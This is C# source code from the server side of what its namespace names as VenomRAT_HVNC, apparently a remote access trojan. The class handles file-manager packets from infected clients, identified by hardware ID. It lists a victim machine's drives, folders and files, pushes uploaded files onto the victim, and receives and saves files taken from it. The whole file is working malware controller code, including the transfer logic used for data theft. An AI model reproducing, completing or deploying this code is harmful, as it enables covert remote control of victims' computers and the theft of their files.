using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Server;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Connection;
using VenomRAT_HVNC.Server.Forms;
using VenomRAT_HVNC.Server.Helper;

namespace VenomRAT_HVNC.Server.Handle_Packet
{
    public class HandleFileManager
    {
        public async void FileManager(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                switch (unpack_msgpack.ForcePathObject("Command").AsString)
                {
                    case "setClient":
                        {
                            FormFileManager formFileManager2 = (FormFileManager)Application.OpenForms["fileManager:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (formFileManager2 != null && formFileManager2.Client == null)
                            {
                                client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString;
                                formFileManager2.Client = client;
                                formFileManager2.timer1.Enabled = true;
                            }
                            break;
                        }
                    case "getDrivers":
                        {
                            FormFileManager formFileManager3 = (FormFileManager)Application.OpenForms["fileManager:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (formFileManager3 == null)
                            {
                                break;
                            }
                            formFileManager3.toolStripStatusLabel1.Text = "";
                            formFileManager3.listView1.Items.Clear();
                            string[] array = unpack_msgpack.ForcePathObject("Driver").AsString.Split(new string[1] { "-=>" }, StringSplitOptions.None);
                            int num;
                            for (num = 0; num < array.Length; num++)
                            {
                                if (array[num].Length > 0)
                                {
                                    ListViewItem listViewItem = new ListViewItem();
                                    listViewItem.Text = array[num];
                                    listViewItem.ToolTipText = array[num];
                                    if (array[num + 1] == "Fixed")
                                    {
                                        listViewItem.ImageIndex = 1;
                                    }
                                    else if (array[num + 1] == "Removable")
                                    {
                                        listViewItem.ImageIndex = 2;
                                    }
                                    else
                                    {
                                        listViewItem.ImageIndex = 1;
                                    }
                                    formFileManager3.listView1.Items.Add(listViewItem);
                                }
                                num++;
                            }
                            break;
                        }
                    case "getPath":
                        {
                            FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (FM != null)
                            {
                                FM.toolStripStatusLabel1.Text = unpack_msgpack.ForcePathObject("CurrentPath").AsString;
                                if (FM.toolStripStatusLabel1.Text.EndsWith("\\"))
                                {
                                    FM.toolStripStatusLabel1.Text = FM.toolStripStatusLabel1.Text.Substring(0, FM.toolStripStatusLabel1.Text.Length - 1);
                                }
                                if (FM.toolStripStatusLabel1.Text.Length == 2)
                                {
                                    FM.toolStripStatusLabel1.Text = FM.toolStripStatusLabel1.Text + "\\";
                                }
                                FM.listView1.BeginUpdate();
                                FM.listView1.Items.Clear();
                                FM.imageList1.Images.Clear();
                                FM.imageList1.Images.Add("0_folder", Image.FromStream(new MemoryStream(Convert.FromBase64String("iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAAFHGlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxNDUgNzkuMTYzNDk5LCAyMDE4LzA4LzEzLTE2OjQwOjIyICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6cGhvdG9zaG9wPSJodHRwOi8vbnMuYWRvYmUuY29tL3Bob3Rvc2hvcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RFdnQ9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZUV2ZW50IyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ0MgMjAxOSAoV2luZG93cykiIHhtcDpDcmVhdGVEYXRlPSIyMDE5LTEyLTEzVDE5OjIyOjU3KzAzOjAwIiB4bXA6TW9kaWZ5RGF0ZT0iMjAxOS0xMi0xM1QxOToyNDowMiswMzowMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAxOS0xMi0xM1QxOToyNDowMiswMzowMCIgZGM6Zm9ybWF0PSJpbWFnZS9wbmciIHBob3Rvc2hvcDpDb2xvck1vZGU9IjMiIHBob3Rvc2hvcDpJQ0NQcm9maWxlPSJzUkdCIElFQzYxOTY2LTIuMSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpkNDU0NTliZC05ZWI0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"))));
                                FM.listView1.Groups.Clear();
                                FM.toolStripStatusLabel3.Text = "";
                                ListViewGroup groupFolder = new ListViewGroup("Folders");
                                ListViewGroup groupFile = new ListViewGroup("Files");
                                FM.listView1.Groups.Add(groupFolder);
                                FM.listView1.Groups.Add(groupFile);
                                ListView.ListViewItemCollection items = FM.listView1.Items;
                                items.AddRange(await Task.Run(() => GetFolders(unpack_msgpack, groupFolder).ToArray()));
                                items = FM.listView1.Items;
                                items.AddRange(await Task.Run(() => GetFiles(unpack_msgpack, groupFile, FM.imageList1).ToArray()));
                                FM.listView1.Enabled = true;
                                FM.listView1.Focus();
                                FM.listView1.EndUpdate();
                                FM.toolStripStatusLabel2.Text = $"       Folder[{FM.listView1.Groups[0].Items.Count}]   Files[{FM.listView1.Groups[1].Items.Count}]";
                            }
                            break;
                        }
                    case "reqUploadFile":
                        {
                            FormDownloadFile FD = (FormDownloadFile)Application.OpenForms[unpack_msgpack.ForcePathObject("ID").AsString];
                            if (FD != null)
                            {
                                FD.Client = client;
                                FD.timer1.Start();
                                MsgPack msgpack = new MsgPack();
                                msgpack.ForcePathObject("Pac_ket").AsString = "fileManager";
                                msgpack.ForcePathObject("Command").AsString = "uploadFile";
                                await msgpack.ForcePathObject("File").LoadFileAsBytes(FD.FullFileName);
                                msgpack.ForcePathObject("Name").AsString = FD.ClientFullFileName;
                                ThreadPool.QueueUserWorkItem(FD.Send, msgpack.Encode2Bytes());
                            }
                            break;
                        }
                    case "error":
                        {
                            FormFileManager formFileManager = (FormFileManager)Application.OpenForms["fileManager:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (formFileManager != null)
                            {
                                formFileManager.listView1.Enabled = true;
                                formFileManager.toolStripStatusLabel3.ForeColor = Color.Red;
                                formFileManager.toolStripStatusLabel3.Text = unpack_msgpack.ForcePathObject("Message").AsString;
                            }
                            break;
                        }
                }
            }
            catch
            {
            }
        }

        public async void SocketDownload(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                string asString = unpack_msgpack.ForcePathObject("Command").AsString;
                if (!(asString == "pre"))
                {
                    if (!(asString == "save"))
                    {
                        return;
                    }
                    try
                    {
                        string asString2 = unpack_msgpack.ForcePathObject("DWID").AsString;
                        FormDownloadFile SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + asString2];
                        if (SD != null && Directory.Exists(SD.DirPath))
                        {
                            string fileName = unpack_msgpack.ForcePathObject("Name").AsString;
                            string dirPath = SD.DirPath;
                            if (File.Exists(dirPath + "\\" + fileName))
                            {
                                fileName = DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + "_" + fileName;
                                await Task.Delay(100);
                            }
                            await Task.Run(() => SaveFileAsync(unpack_msgpack.ForcePathObject("File"), dirPath + "\\" + fileName));
                            SD.Close();
                        }
                    }
                    catch
                    {
                    }
                    finally
                    {
                        GC.Collect();
                    }
                    return;
                }
                string asString3 = unpack_msgpack.ForcePathObject("DWID").AsString;
                string asString4 = unpack_msgpack.ForcePathObject("File").AsString;
                string asString5 = unpack_msgpack.ForcePathObject("Size").AsString;
                FormDownloadFile formDownloadFile = (FormDownloadFile)Application.OpenForms["socketDownload:" + asString3];
                if (formDownloadFile != null)
                {
                    formDownloadFile.Client = client;
                    formDownloadFile.labelfile.Text = Path.GetFileName(asString4);
                    formDownloadFile.FileSize = Convert.ToInt64(asString5);
                    formDownloadFile.timer1.Start();
                }
            }
            catch
            {
            }
        }

        private async Task SaveFileAsync(MsgPack unpack_msgpack, string name)
        {
            await unpack_msgpack.SaveBytesToFile(name);
        }

        private List<ListViewItem> GetFolders(MsgPack unpack_msgpack, ListViewGroup listViewGroup)
        {
            string[] array = unpack_msgpack.ForcePathObject("Folder").AsString.Split(new string[1] { "-=>" }, StringSplitOptions.None);
            List<ListViewItem> list = new List<ListViewItem>();
            int num = 0;
            int num2;
            for (num2 = 0; num2 < array.Length; num2++)
            {
                if (array[num2].Length > 0)
                {
                    ListViewItem listViewItem = new ListViewItem();
                    listViewItem.Text = array[num2];
                    listViewItem.ToolTipText = array[num2 + 1];
                    listViewItem.Group = listViewGroup;
                    listViewItem.ImageIndex = 0;
                    list.Add(listViewItem);
                    num++;
                }
                num2++;
            }
            return list;
        }

        private List<ListViewItem> GetFiles(MsgPack unpack_msgpack, ListViewGroup listViewGroup, ImageList imageList1)
        {
            string[] _files = unpack_msgpack.ForcePathObject("File").AsString.Split(new string[1] { "-=>" }, StringSplitOptions.None);
            List<ListViewItem> list = new List<ListViewItem>();
            for (int i = 0; i < _files.Length; i++)
            {
                if (_files[i].Length > 0)
                {
                    ListViewItem listViewItem = new ListViewItem();
                    listViewItem.Text = Path.GetFileName(_files[i]);
                    listViewItem.ToolTipText = _files[i + 1];
                    Image im = Image.FromStream(new MemoryStream(Convert.FromBase64String(_files[i + 2])));
                    Program.form1.Invoke((MethodInvoker)delegate
                    {
                        imageList1.Images.Add(_files[i + 1], im);
                    });
                    listViewItem.ImageKey = _files[i + 1];
                    listViewItem.Group = listViewGroup;
                    listViewItem.SubItems.Add(Methods.BytesToString(Convert.ToInt64(_files[i + 3])));
                    list.Add(listViewItem);
                }
                i += 3;
            }
            return list;
        }
    }
}